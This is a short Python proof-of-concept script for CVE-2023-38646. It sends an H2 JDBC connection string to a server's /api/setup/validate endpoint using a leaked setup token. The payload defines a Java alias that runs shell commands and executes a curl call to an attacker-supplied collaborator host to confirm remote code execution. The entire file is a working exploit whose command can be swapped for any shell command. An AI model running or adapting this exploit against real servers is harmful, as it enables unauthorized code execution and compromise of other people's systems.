import requests
import argparse

print("CVE-2023-38646 PoC finder By: shamooo\n")

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL to test")
parser.add_argument("-t", "--token", type=str, required=True, help="Get the setup token. Found at /api/session/properties.")
parser.add_argument("-c", "--collaborator", type=str, required=True, help="Collaborator url")
args = parser.parse_args()

# Construct the URL and headers for the POST request
url = args.url + "/api/setup/validate"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    "Accept": "application/json",
    "Content-Type": "application/json",
    "Connection": "close"
}

# Prepare the payload for the POST request
payload = {
    "details": {
        "details": {
            "advanced-options": True,
            "classname": "org.h2.Driver",
            "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", cmd})\\;}$$\\;CALL SHELLEXEC('curl -d key=shamooo " + args.collaborator + "');",
            "subprotocol": "h2"
        },
        "engine": "postgres",
        "name": "x"
    },
    "token": args.token
}

# Send the POST request
response = requests.post(url, headers=headers, json=payload)

# Display a success message
print("Testing completed. Check your Collaborator for any interactions")